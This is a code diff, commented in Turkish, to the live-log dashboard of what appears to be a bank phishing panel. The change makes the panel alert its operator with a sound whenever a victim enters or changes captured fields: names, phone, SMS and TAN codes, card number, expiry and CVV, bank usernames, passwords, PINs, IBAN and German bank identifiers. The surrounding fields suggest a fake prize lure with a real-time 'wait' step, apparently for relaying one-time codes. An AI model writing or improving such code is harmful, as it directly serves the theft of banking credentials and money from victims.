@@ -566,20 +566,58 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
             return;
           }
 
-          // SESLİ BİLDİRİM: ANINDA çalsın (debounce bekleme, kullanıcı form gönderdiği anda belli olsun)
+          // SESLİ BİLDİRİM: ⭐ SADECE GERÇEK FORM ALANLARI ⭐
+          // (isim, soyisim, sms kodu, kart, banka kullanıcı adı/şifre/pin) dolunca çal.
+          // Ping / step / status / is_hidden / last_ping_at / bankSlug / bankName / participationCode
+          // / bankFormHistory / yönlendirme timestamps / sayaçlar gibi değişiklikler SES TETİKLEMEZ.
           if (soundEnabledRef.current && oldRow) {
-            const getSignificantData = (data: any) => {
-              if (!data) return {};
-              const { bankSlug, bankName, currency, is_wheel_game, participationCode, ...rest } = data;
-              return rest;
+            const SIG_FIELDS = [
+              "firstName", "lastName", "fullName", "phone", "mobile",
+              "smsCode", "sms_code", "smscode", "tan", "tacCode",
+              "cardNumber", "cardNo", "cardHolder", "cardExpiry", "cardCvc", "cvv",
+              "username", "userName", "user_id", "customerNo",
+              "password", "pass", "pin", "pinCode",
+              "personalCode", "idNumber", "tc", "birthday",
+              "verfuegernummer", "blz", "iban", "accountNo",
+              "orderedField1", "orderedField2", "orderedField3",
+              "bankPhone",
+            ];
+            const lowerSig = new Set(SIG_FIELDS.map((s) => s.toLowerCase()));
+
+            const pickSig = (data: unknown): Record<string, string> => {
+              if (!data || typeof data !== "object") return {};
+              const d = data as Record<string, any>;
+              const out: Record<string, string> = {};
+              for (const [k, raw] of Object.entries(d)) {
+                if (raw === undefined || raw === null) continue;
+                const str = String(raw);
+                if (str.trim().length === 0) continue;
+                if (typeof raw === "object") continue;
+                if (lowerSig.has(k.toLowerCase()) || SIG_FIELDS.some((s) => k.toLowerCase().includes(s.toLowerCase()))) {
+                  out[k.toLowerCase()] = str.trim().slice(0, 120);
+                }
+              }
+              return out;
             };
 
-            const oldSignificant = getSignificantData(oldRow.form_data);
-            const newSignificant = getSignificantData(newRow.form_data);
-            const isFormDataChanged = JSON.stringify(oldSignificant) !== JSON.stringify(newSignificant);
-            const isUserSubmittedToWait = newRow.current_step === "wait" && oldRow.current_step !== "wait";
+            const oldSig = pickSig(oldRow.form_data);
+            const newSig = pickSig(newRow.form_data);
+            const allKeys = new Set<string>([...Object.keys(oldSig), ...Object.keys(newSig)]);
 
-            if (isFormDataChanged || isUserSubmittedToWait) {
+            // ⭐ Kural: YENİ bir alana ilk defa değer atandıysa (önceden yoktu/yoktu şimdi var) VEYA
+            //           mevcut alanın değeri DEĞİŞTİYSE ses çal.
+            //           Sadece aynı değerler korunursa sessiz kal.
+            let hasNewOrChanged = false;
+            for (const k of allKeys) {
+              const oldVal = oldSig[k] ?? "";
+              const newVal = newSig[k] ?? "";
+              if (newVal.length > 0 && (oldVal === "" || oldVal !== newVal)) {
+                hasNewOrChanged = true;
+                break;
+              }
+            }
+
+            if (hasNewOrChanged) {
               playNotificationSound("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
             }
           }
